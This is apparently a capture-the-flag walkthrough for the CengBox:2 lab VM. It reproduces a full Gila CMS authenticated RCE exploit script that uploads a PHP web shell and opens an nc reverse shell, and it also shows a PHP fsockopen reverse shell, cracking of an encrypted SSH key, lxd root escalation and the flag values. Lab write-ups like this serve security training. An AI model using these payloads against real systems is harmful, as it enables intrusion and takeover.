# CengBox: 2 Walkthrough

# Description
```bash
Name : CengBox:2

Goal : Get the user and the root flag

Diffuculty : Intermediate

Description : Looks like Ceng Company has site maintenance but there might be something that still working.

In this vm you may learn a few new things such as enumeration, CVE, privilege escalation and more. You will need everything that you found. Also you will have to check the differences and guess some things.

Tested on Virtualbox. The machine works properly with Virtualbox compared to Vmware.

For any feedback or hint feel free to contact me on Twitter @arslanblcn_

This works better with VirtualBox rather than VMware.
```

# Exploitation
Let's start with network scan
```bash
Currently scanning: 192.168.0.1/24   |   Screen View: Unique Hosts                                                                                                                                               
                                                                                                                                                                                                                  
 3 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 180                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.103   58:11:22:85:0d:41      2     120  ASUSTek COMPUTER INC.                                                                                                                                          
 192.168.0.110   08:00:27:69:d4:5f      1      60  PCS Systemtechnik GmbH                                                                                                                                         

```
\
Next finding open ports on the target machine
```bash
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```
\
Checking port 80 on burpsuite shows us this home page
\
<img width="1426" height="628" alt="image" src="https://github.com/user-attachments/assets/492671a4-9ccc-4cae-afea-c7a9591a35b7" />
\
I tried doing some enumeration but could not find anything useful, then i swith to checking port 21
```bash
ftp 192.168.0.110                                                                                                                       
Connected to 192.168.0.110.
220 (vsFTPd 3.0.3)
Name (192.168.0.110:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||20460|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        119          4096 May 23  2020 .
drwxr-xr-x    2 0        119          4096 May 23  2020 ..
-rw-r--r--    1 0        0             209 May 23  2020 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||33072|)
150 Opening BINARY mode data connection for note.txt (209 bytes).
100% |**********************************************************************************************************************************************************************|   209      348.89 KiB/s    00:00 ETA
226 Transfer complete.
209 bytes received in 00:00 (175.94 KiB/s)
```
\
We got a file note.txt 
```bash
Hey Kevin,
I just set up your panel and used default password. Please change them before any hack.

I try to move site to new domain which name is ceng-company.vm and also I created a new area for you.

Aaron
```
\
So , lets add the hostname "ceng-company.vm" to our /etc/hosts file
\
Since the author hinted a specific domain name , i assumed there would be a hidden sub-domain , so checked for it
```bash
ffuf -u http://ceng-company.vm/ -H "Host: FUZZ.ceng-company.vm" \
-w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --fs 555

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://ceng-company.vm/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.ceng-company.vm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 555
________________________________________________

admin                   [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 410ms]
:: Progress: [19966/19966] :: Job [1/1] :: 519 req/sec :: Duration: [0:00:04] :: Errors: 0 ::

```
\
Found "admin.ceng-company.vm" , lets add it to our hosts file and start enumeration again
```bash
ffuf -u http://admin.ceng-company.vm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -r 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://admin.ceng-company.vm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 2ms]
# This work is licensed under the Creative Commons [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 2ms]
# directory-list-2.3-medium.txt [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 3ms]
                        [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 3ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 211ms]
#                       [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 320ms]
#                       [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 324ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 325ms]
# Copyright 2007 James Fisher [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 326ms]
#                       [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 334ms]
# on at least 2 different hosts [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 380ms]
# Priority ordered case-sensitive list, where entries were found [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 489ms]
#                       [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 489ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 498ms]
                        [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 6ms]
server-status           [Status: 403, Size: 309, Words: 22, Lines: 12, Duration: 6ms]
gila                    [Status: 200, Size: 3916, Words: 522, Lines: 108, Duration: 1162ms]
:: Progress: [220559/220559] :: Job [1/1] :: 7142 req/sec :: Duration: [0:00:32] :: Errors: 0 ::
```
\
Found that , there is a gila cms website
\
<img width="1476" height="657" alt="image" src="https://github.com/user-attachments/assets/ad27a719-d26f-46ca-8d3d-466138fcd8d3" />
\
Then we remember from the note , that the credentials could be 
```bash
kevin@ceng-company.vm : admin
```
\
WE login using those creds
\
<img width="1721" height="737" alt="image" src="https://github.com/user-attachments/assets/bfdf0528-ee29-4c65-bb35-e427ca606474" />
\
\
after a little bit of checking , found this config file
\
<img width="1489" height="758" alt="image" src="https://github.com/user-attachments/assets/6e3f819b-f32a-4392-b7df-c87375e0ae28" />
\
So i think we now have the credentials for kevin to ssh 
```bash
kevin : SuperS3cR3TPassw0rd1!
```
\
But the credentials didnt work so now i will have to use other methods
\
Checking for known vulnerabilities using searchsploit gave us a Remote Code Execution in this exact version of gila cms
```bash
searchsploit gila cms     
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Gila CMS 1.10.9 - Remote Code Execution (RCE) (Authenticated)                                                                                                                    | php/webapps/51569.py
Gila CMS 1.11.8 - 'query' SQL Injection                                                                                                                                          | php/webapps/48590.py
Gila CMS 1.9.1 - Cross-Site Scripting                                                                                                                                            | php/webapps/46557.txt
Gila CMS 2.0.0 - Remote Code Execution (Unauthenticated)                                                                                                                         | php/webapps/49412.py
Gila CMS < 1.11.1 - Local File Inclusion                                                                                                                                         | multiple/webapps/47407.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
\
POC Taken from exploit-db
```bash
# Exploit Title: Gila CMS 1.10.9 - Remote Code Execution (RCE) (Authenticated)
# Date: 05-07-2023
# Exploit Author: Omer Shaik (unknown_exploit)
# Vendor Homepage: https://gilacms.com/
# Software Link: https://github.com/GilaCMS/gila/
# Version: Gila 1.10.9
# Tested on: Linux

import requests
from termcolor import colored
from urllib.parse import urlparse

# Print ASCII art
ascii_art = """
 ██████╗ ██╗██╗      █████╗      ██████╗███╗   ███╗███████╗    ██████╗  ██████╗███████╗
██╔════╝ ██║██║     ██╔══██╗    ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔════╝██╔════╝
██║  ███╗██║██║     ███████║    ██║     ██╔████╔██║███████╗    ██████╔╝██║     █████╗  
██║   ██║██║██║     ██╔══██║    ██║     ██║╚██╔╝██║╚════██║    ██╔══██╗██║     ██╔══╝  
╚██████╔╝██║███████╗██║  ██║    ╚██████╗██║ ╚═╝ ██║███████║    ██║  ██║╚██████╗███████╗
 ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝     ╚═════╝╚═╝     ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝╚══════╝

                              by Unknown_Exploit
"""

print(colored(ascii_art, "green"))

# Prompt user for target URL
target_url = input("Enter the target login URL (e.g., http://example.com/admin/): ")

# Extract domain from target URL
parsed_url = urlparse(target_url)
domain = parsed_url.netloc
target_url_2 = f"http://{domain}/"

# Prompt user for login credentials
username = input("Enter the email: ")
password = input("Enter the password: ")

# Create a session and perform login
session = requests.Session()
login_payload = {
    'action': 'login',
    'username': username,
    'password': password
}
response = session.post(target_url, data=login_payload)
cookie = response.cookies.get_dict()
var1 = cookie['PHPSESSID']
var2 = cookie['GSESSIONID']

# Prompt user for local IP and port
lhost = input("Enter the local IP (LHOST): ")
lport = input("Enter the local port (LPORT): ")

# Construct the payload
payload = f"rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/bash+-i+2>%261|nc+{lhost}+{lport}+>/tmp/f"
payload_url = f"{target_url_2}tmp/shell.php7?cmd={payload}"

# Perform file upload using POST request
upload_url = f"{target_url_2}fm/upload"
upload_headers = {
    "Host": domain,
    "Content-Length": "424",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarynKy5BIIJQcZC80i2",
    "Accept": "*/*",
    "Origin": target_url_2,
    "Referer": f"{target_url_2}admin/fm?f=tmp/.htaccess",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9",
    "Cookie": f"PHPSESSID={var1}; GSESSIONID={var2}",
    "Connection": "close"
}
upload_data = f'''
------WebKitFormBoundarynKy5BIIJQcZC80i2
Content-Disposition: form-data; name="uploadfiles"; filename="shell.php7"
Content-Type: application/x-php

<?php system($_GET["cmd"]);?>

------WebKitFormBoundarynKy5BIIJQcZC80i2
Content-Disposition: form-data; name="path"

tmp
------WebKitFormBoundarynKy5BIIJQcZC80i2
Content-Disposition: form-data; name="g_response"

content
------WebKitFormBoundarynKy5BIIJQcZC80i2--
'''

upload_response = session.post(upload_url, headers=upload_headers, data=upload_data)

if upload_response.status_code == 200:
    print("File uploaded successfully.")
    # Execute payload
    response = session.get(payload_url)
    print("Payload executed successfully.")
else:
    print("Error uploading the file:", upload_response.text)
```
\
In this poc , we have to change the line 
```bash
target_url_2 = f"http://{domain}/"
```
To
```bash
target_url_2 = f"http://admin.ceng-company.vm/gila/"
```
\
And then give the remaining details , and we will get a reverse shell as www-data
```bash
python 1.py

 ██████╗ ██╗██╗      █████╗      ██████╗███╗   ███╗███████╗    ██████╗  ██████╗███████╗                                                                                                                            
██╔════╝ ██║██║     ██╔══██╗    ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔════╝██╔════╝                                                                                                                            
██║  ███╗██║██║     ███████║    ██║     ██╔████╔██║███████╗    ██████╔╝██║     █████╗                                                                                                                              
██║   ██║██║██║     ██╔══██║    ██║     ██║╚██╔╝██║╚════██║    ██╔══██╗██║     ██╔══╝                                                                                                                              
╚██████╔╝██║███████╗██║  ██║    ╚██████╗██║ ╚═╝ ██║███████║    ██║  ██║╚██████╗███████╗                                                                                                                            
 ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝     ╚═════╝╚═╝     ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝╚══════╝                                                                                                                            
                                                                                                                                                                                                                   
                              by Unknown_Exploit                                                                                                                                                                   
                                                                                                                                                                                                                   
Enter the target login URL (e.g., http://example.com/admin/): http://admin.ceng-company.vm/gila/admin
Enter the email: kevin@ceng-company.vm
Enter the password: admin
Enter the local IP (LHOST): 192.168.0.124
Enter the local port (LPORT): 4444
File uploaded successfully.
```
```bash
penelope

[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.0.124
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from cengbox~192.168.0.110-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/cengbox~192.168.0.110-Linux-x86_64/2026_04_18-07_17_24-592.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@cengbox:/var/www/admin/gila/tmp$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@cengbox:/var/www/admin/gila/tmp$ 
```
\
We check the users on the target machine 
```bash
www-data@cengbox:/home$ ls -la
total 16
drwxr-xr-x  4 root    root       4096 May 23  2020 .
drwxr-xr-x 23 root    root       4096 May 23  2020 ..
drwxr-x---  4 mitnick developers 4096 May 25  2020 mitnick
drwxr-xr-x  4 swartz  swartz     4096 May 26  2020 swartz
www-data@cengbox:/home$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
mitnick:x:1000:1002:mitnick,,,:/home/mitnick:/bin/bash
www-data@cengbox:/home$ cat /etc/passwd | grep swartz
swartz:x:1001:1002::/home/swartz:
```
\
Here we can notice that both the users are of the same group developers
```bash
uid=1000(mitnick) gid=1002(developers) groups=1002(developers),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare)
uid=1001(swartz) gid=1002(developers) groups=1002(developers)
```
\
And surprisingly the user www-data had sudo priviledges
```bash
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                    
Matching Defaults entries for www-data on cengbox:                                                                                                                                                                 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on cengbox:
    (swartz) NOPASSWD: /home/swartz/runphp.sh
```
\
So we can run interactive php commands as user swartz , so lets get a reverse shell on different port
```bash
www-data@cengbox:/home/swartz$ cat runphp.sh 
#!/bin/bash

php -a
www-data@cengbox:/home/swartz$ sudo -u swartz /home/swartz/runphp.sh
Interactive mode enabled

php > $sock=fsockopen("192.168.0.124",4445);exec("sh <&3 >&3 2>&3");

```
\
Now on our penelope listener , we have a shell as the user swartz
```bash
penelope -p 4445
[+] Listening for reverse shells on 0.0.0.0:4445 →  127.0.0.1 • 192.168.0.124
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from cengbox~192.168.0.110-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/cengbox~192.168.0.110-Linux-x86_64/2026_04_19-02_06_41-226.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
swartz@cengbox:/var/www/admin/gila/tmp$ id
uid=1001(swartz) gid=1002(developers) groups=1002(developers)
swartz@cengbox:/var/www/admin/gila/tmp$ cd ~
swartz@cengbox:~$ ls -la
total 44
drwxr-xr-x 4 swartz swartz     4096 May 26  2020 .
drwxr-xr-x 4 root   root       4096 May 23  2020 ..
-rw------- 1 swartz swartz        1 May 26  2020 .bash_history
-rw-r--r-- 1 swartz swartz      220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 swartz swartz     3771 Aug 31  2015 .bashrc
drwx------ 2 swartz swartz     4096 May 23  2020 .cache
drwx------ 2 swartz developers 4096 May 26  2020 .gnupg
-rw------- 1 swartz developers  157 Apr 18 23:06 .php_history
-rw-r--r-- 1 swartz swartz      655 May 16  2017 .profile
-rw------- 1 swartz developers    1 May 26  2020 .viminfo
-rwxr-xr-x 1 swartz swartz       20 May 26  2020 runphp.sh
swartz@cengbox:~$ 
```
\
Since this user is in the "ddevelopers" group , i checked what all files we could access
```bash
swartz@cengbox:~$ find / type  -group developers 2>/dev/null
/home/mitnick
/home/mitnick/.ssh
/home/mitnick/.ssh/id_rsa.pub
/home/mitnick/.ssh/authorized_keys
/home/mitnick/.ssh/id_rsa
/home/swartz/.gnupg
/home/swartz/.gnupg/trustdb.gpg
/home/swartz/.gnupg/gpg.conf
/home/swartz/.gnupg/pubring.gpg
/home/swartz/.viminfo
/home/swartz/.php_history
```
\
And we have .ssh private key of the user "mitnick" here , which is pretty great as we can just switch over 
```bash
swartz@cengbox:~$ cat /home/mitnick/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,21425CA12E394F02C77645793C350D91

jOzfhmCwJQ8eqkzxuAgaXxy8Nh0AL1NR2dXz0tZVbSRRKdUcAeXQFkNYdAH+InjR
mg0FUtcz69l5iomrBHd71ZnK4iQMVcZZ37r8fAQppvZVGhKbf5DGmnyDZiTxGtdv
O6kEQOXOAVUce+bMDEgChMEdORmk2yisizjDi9IMttWQ3VMyaHoyRp2UOCjntZPC
KcpQMGjWJEos3ZrlIrfX/FSkfT0QkwdzkigeJsC7zH0AioH55tdfAY8d33AJuSQ0
7I7z5qMfn7tfNd8n642xFGnRV2YMCYiO8XB0f5OJz67T4doagB985ZNDtqJdxkoF
kXlqdvs1KJzCAMu9m0m4UV7ZR7qmYKiFXnEkl/hE9i3CF9S6UOjKKRZq26TpJVj4
a4WJ+yauszPVI9KlnB7X9g5cd3Xoe04ROWbaVhx0tv3ipjcbGOPcuQudiMH8P0rj
pXI0YD/nDSV9gCqfgi0wJTag8LK+4ZUENHu3ThukuONCGZpkdJg/UETu9m8Cl8CR
pa4khXbI+1J7frvqUFq+op3CBT4GccKUbD4B/Sa2BLjsOV75A/tpffr2ROo8KxaL
HFHJUqwhTCk6qp5Hx6tQWtaUQ7gdOJ1BMARts/x3rGpphdmSwqZqusdrw/KS3TbH
VkjpO5lABvEMGl2/HbB2flEZk+fkJ3YNq78+IQSxNSDFPsAIMySFmro+tf9X7KWu
hna6795X13c+WdE5hEsK6X2bOkZhFln/6Rkz5BsWNlaBVQwYfthfepN+e4NwdtcT
e/NZt/Cppe+J74ABmC8FyKVr+sbnb2MWWwg2nQ9aPEcDinjWk7ALtJbwIG46Udb9
l/c8/RSot4rRA3ADHj5JZtEAnnrwCHO7cc4yGLEJOneSPxz4yW8vSGDd7iAWjYuE
Y0CDY6iH2cvi3rrVrfUZ1beHMcegRtsTgPj2tbd7x4FD6xY+Vha+Va/OV6F7kuE7
fgS5uJs/WqCVemQWKLfa22AMeCRn5qB9AT1gAGbH5oFlrOtOvvbpZsdiRSp86mx5
/Pzrio/5e0kZ1b4+PF1cUOzFJOVOADl8hGQxE9LYOozxKGdSEP1oJOhThCGQVK8W
cQZ91RSt5tbQbhO3T4r8whOgOFyf3N/jEJ2IBzFKDZAqn0oxUzQFcBnsYIMhO29F
bTH6WyWaIy97HxSEzMmMUJo78n8uptNkglFPYp0LTzTEXsEYC6WxGBIihXQHEJlJ
1XxTCMoZFkZ2IpL9TmRtdWcqKBjiXLXuPjpMaIlg3tL8AEqR92stCPpyIVkfsxRf
j+FgaA97zTv8je+uGIAyv3fl3W69LOsMSTGwZutxngBsyhK3FbzF5r1c6c55jxXK
Tj+QuvPjLwGNT9KQ3XT4oGe5KSiSQ3ZhA4K1AhGyfCxhA2hdK7Y9RZVxKISCzjsY
4oNeFNZKIhTIWITNcr4/ebGiQuyLyOQpTgP6kpiLDYcZlPdIjdBAEjF+5rVcuxfB
xtHilk7LLiLarD6lFaF4bYoB2lwW0ioUzvZYUjLIT7RyrDa6tnidXI9aVAWgLFor
xi3Ed0lgkxkFm6AFQ0Zq1R8MqI4+6apX4nqqV/ybGpBFwpjgI//mOlHf9kdxp0Pk
-----END RSA PRIVATE KEY-----
```
\
This private rsa file is encrypted , so we have to use ssh2john to crack the password
```bash
john -w:/usr/share/wordlists/rockyou.txt enc-id_rsa
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
legend           (mitnick-id_rsa)     
1g 0:00:00:00 DONE (2026-04-19 02:17) 100.0g/s 195200p/s 195200c/s 195200C/s amore..mandy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
\
Now , we can ssh as mitnick
```bash
mitnick@cengbox:~$ id
uid=1000(mitnick) gid=1002(developers) groups=1002(developers),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare)
mitnick@cengbox:~$ ls -la
total 48
drwxr-x--- 4 mitnick developers 4096 May 25  2020 .
drwxr-xr-x 4 root    root       4096 May 23  2020 ..
-rw------- 1 mitnick mitnick       1 May 26  2020 .bash_history
-rw-r--r-- 1 mitnick mitnick     220 May 23  2020 .bash_logout
-rw-r--r-- 1 mitnick mitnick    3771 May 23  2020 .bashrc
drwx------ 2 mitnick mitnick    4096 May 23  2020 .cache
-rw------- 1 mitnick mitnick     505 May 23  2020 .mysql_history
-rw------- 1 mitnick mitnick       1 May 26  2020 .php_history
-rw-r--r-- 1 mitnick mitnick     655 May 23  2020 .profile
drwxr-x--- 2 mitnick developers 4096 May 25  2020 .ssh
-rw------- 1 mitnick mitnick      33 May 23  2020 user.txt
-rw------- 1 mitnick mitnick       1 May 26  2020 .viminfo
mitnick@cengbox:~$ sudo -l
[sudo] password for mitnick: 
mitnick@cengbox:~$ cat user.txt 
a10333b0b7c3f914e8c446fd8e9cd362
```
\
Then we know that the user is in lxd group , so we can use lxd priviledge escalation to root
```bash
mitnick@cengbox:~$ cd /tmp
mitnick@cengbox:/tmp$ wget 'http://192.18.0.124:9000/alpine-v3.13-x86_64-20210218_0139.tar.gz'
--2026-04-18 23:37:23--  http://192.18.0.124:9000/alpine-v3.13-x86_64-20210218_0139.tar.gz
Connecting to 192.18.0.124:9000... ^C
mitnick@cengbox:/tmp$ wget 'http://192.168.0.124:9000/alpine-v3.13-x86_64-20210218_0139.tar.gz'
--2026-04-18 23:37:32--  http://192.168.0.124:9000/alpine-v3.13-x86_64-20210218_0139.tar.gz
Connecting to 192.168.0.124:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3259593 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’

alpine-v3.13-x86_64-20210218_0139.tar.gz             100%[=====================================================================================================================>]   3.11M  --.-KB/s    in 0.02s   

2026-04-18 23:37:32 (163 MB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]

mitnick@cengbox:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
mitnick@cengbox:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Apr 19, 2026 at 6:37am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
mitnick@cengbox:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
mitnick@cengbox:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
mitnick@cengbox:/tmp$ lxc start ignite
mitnick@cengbox:/tmp$ lxc exec ignite /bin/sh
id~ # id
uid=0(root) gid=0(root)
~ # cd /mnt/root/root
/mnt/root/root # ls -la
total 36
drwx------    3 root     root          4096 May 26  2020 .
drwxr-xr-x   23 root     root          4096 May 23  2020 ..
-rw-------    1 root     root             0 May 26  2020 .bash_history
-rw-r--r--    1 root     root          3106 Oct 22  2015 .bashrc
drwxr-xr-x    2 root     root          4096 May 23  2020 .nano
-rw-------    1 root     root             1 May 26  2020 .php_history
-rw-r--r--    1 root     root           148 Aug 17  2015 .profile
-rw-r--r--    1 root     root            66 May 23  2020 .selected_editor
-rw-------    1 root     root             1 May 26  2020 .viminfo
-rw-r--r--    1 root     root           518 May 23  2020 root.txt
/mnt/root/root # cat root.txt 
  _____ ______             ____            ___  
 / ____|  ____|           |  _ \          |__ \ 
| |    | |__   _ __   __ _| |_) | _____  __  ) |
| |    |  __| | '_ \ / _` |  _ < / _ \ \/ / / / 
| |____| |____| | | | (_| | |_) | (_) >  < / /_ 
 \_____|______|_| |_|\__, |____/ \___/_/\_\____|
                      __/ |                     
                     |___/                      

I would be grateful for your any feedback. Feel free to contact me on Twitter @arslanblcn_

de89782fe4e8bf2198a022ae7f50613e
```
\
Then end , thank you for reading till here
